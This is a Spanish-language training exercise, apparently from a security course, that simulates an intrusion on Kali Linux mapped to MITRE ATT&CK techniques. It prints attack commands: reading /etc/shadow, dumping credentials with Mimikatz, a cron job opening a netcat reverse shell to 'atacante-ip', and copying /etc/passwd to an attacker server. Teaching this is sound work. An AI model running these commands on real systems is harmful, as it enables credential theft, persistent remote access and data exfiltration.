![M1](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%201%402Menbrete1.png)

# **Aplicación Práctica en Kali Linux: Simulación de Ataques con MITRE ATT&CK**

Vamos a realizar una práctica utilizando herramientas de Kali Linux para simular ataques documentados en MITRE ATT&CK.

### **📌 Escenario: Movimiento Lateral y Robo de Credenciales**

Un atacante ha obtenido acceso a una máquina y quiere moverse lateralmente y obtener credenciales.

### **📌 Paso 1: Enumeración del Sistema (Tactic: Discovery - T1082)**

Ver información del sistema comprometido:

```bash
uname -a
whoami
id
```

### **📌 Paso 2: Robo de Credenciales (Tactic: Credential Access - T1003)**

Si el atacante tiene acceso root, puede extraer credenciales:

```bash
cat /etc/shadow
```

O con `Mimikatz` en Windows:

```bash
Invoke-Mimikatz -DumpCreds
```

### **📌 Paso 3: Movimiento Lateral con SSH (Tactic: Lateral Movement - T1021.004)**

Si el atacante ha obtenido credenciales, puede intentar moverse lateralmente:

```bash
ssh usuario@victima-ip
```

### **📌 Paso 4: Persistencia con Tareas Cron (Tactic: Persistence - T1053.003)**

Agregar una tarea cron maliciosa para mantener acceso:

```bash
echo "* * * * * /bin/bash -c 'nc -e /bin/bash atacante-ip 4444'" >> /etc/crontab
```

### **📌 Paso 5: Exfiltración de Datos (Tactic: Exfiltration - T1041)**

Transferir archivos fuera del sistema comprometido:

```bash
scp /etc/passwd atacante@servidor:~/datos-robados/
```



![M2](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%203%402Menbrete2.png)